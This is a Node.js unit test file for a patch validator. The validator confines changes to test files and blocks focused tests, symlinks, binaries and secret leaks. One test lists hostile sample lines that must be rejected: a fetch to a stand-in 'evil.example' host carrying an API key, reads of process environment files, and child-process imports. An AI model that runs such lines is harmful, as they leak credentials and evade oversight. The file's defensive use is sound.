import assert from 'node:assert/strict'
import { describe, it } from 'node:test'
import { checkPatch } from './check-patch.mjs'

const newFile = (file, body = "+it('works', () => {})", mode = '100644') =>
  `diff --git a/${file} b/${file}\nnew file mode ${mode}\nindex 0000000..1111111\n--- /dev/null\n+++ b/${file}\n@@ -0,0 +1 @@\n${body}\n`
const modified = (file, body = "+it('works', () => {})") =>
  `diff --git a/${file} b/${file}\nindex 1111111..2222222 100644\n--- a/${file}\n+++ b/${file}\n@@ -1 +1,2 @@\n ctx\n${body}\n`

describe('checkPatch', () => {
  it('accepts new and modified unit tests and fixtures', () => {
    const result = checkPatch(
      newFile('backend/tests/stats.test.ts') + modified('backend/tests/fixture.ts') + modified('frontend/src/features/todos/TodosPage.test.tsx'),
    )
    assert.equal(result.ok, true, result.violations.join('\n'))
    assert.deepEqual(
      result.files.map((file) => [file.path, file.status]),
      [
        ['backend/tests/stats.test.ts', 'added'],
        ['backend/tests/fixture.ts', 'modified'],
        ['frontend/src/features/todos/TodosPage.test.tsx', 'modified'],
      ],
    )
    assert.equal(result.addedLines, 3)
  })

  it('accepts an empty patch', () => {
    assert.deepEqual(checkPatch(''), { ok: true, files: [], addedLines: 0, violations: [] })
  })

  it('rejects changes outside test paths', () => {
    for (const file of ['backend/src/factory.ts', 'frontend/package.json', 'backend/vitest.config.ts', 'frontend/src/test/setup.ts', '.github/workflows/ci.yml']) {
      const result = checkPatch(modified(file))
      assert.equal(result.ok, false, file)
      assert.match(result.violations[0], /not a writable test path/)
    }
  })

  it('rejects symlinks, executables, mode changes, deletions, renames and binaries', () => {
    const cases = [
      newFile('backend/tests/link.test.ts', '+../src/factory.ts', '120000'),
      newFile('backend/tests/run.test.ts', '+x', '100755'),
      'diff --git a/backend/tests/a.test.ts b/backend/tests/a.test.ts\nold mode 100644\nnew mode 100755\n',
      'diff --git a/backend/tests/a.test.ts b/backend/tests/a.test.ts\ndeleted file mode 100644\n',
      'diff --git a/backend/tests/a.test.ts b/backend/tests/b.test.ts\nsimilarity index 100%\nrename from backend/tests/a.test.ts\nrename to backend/tests/b.test.ts\n',
      'diff --git a/backend/tests/a.test.ts b/backend/tests/a.test.ts\nGIT binary patch\nliteral 1\n',
    ]
    for (const patch of cases) assert.equal(checkPatch(patch).ok, false, patch)
  })

  it('rejects renames that move a source file into the test folder', () => {
    const patch = 'diff --git a/backend/src/x.ts b/backend/tests/x.test.ts\nrename from backend/src/x.ts\nrename to backend/tests/x.test.ts\n'
    assert.ok(checkPatch(patch).violations.some((violation) => violation.startsWith('backend/src/x.ts')))
  })

  it('rejects quoted paths', () => {
    assert.equal(checkPatch('diff --git "a/backend/tests/a b.test.ts" "b/backend/tests/a b.test.ts"\n').ok, false)
  })

  it('rejects focused or skipped tests, credentials and process spawning', () => {
    for (const body of [
      "+it.only('x', () => {})",
      "+describe.skip('x', () => {})",
      "+it.todo('x')",
      "+xit('x', () => {})",
      '+const key = "sk-ant-api03-abcdefghijklmnop"',
      '+fetch("https://evil.example", { body: process.env.ANTHROPIC_API_KEY })',
      "+import { execSync } from 'node:child_process'",
      "+readFileSync(`/proc/${process.ppid}/environ`, 'utf8')",
      "+readFileSync('/proc/self/environ')",
      '+console.log(JSON.stringify(process.env))',
    ]) {
      assert.equal(checkPatch(modified('backend/tests/router.test.ts', body)).ok, false, body)
    }
  })

  it('does not flag forbidden words in removed or context lines', () => {
    assert.equal(checkPatch(modified('backend/tests/router.test.ts', "-it.only('x', () => {})\n+it('x', () => {})")).ok, true)
  })
})
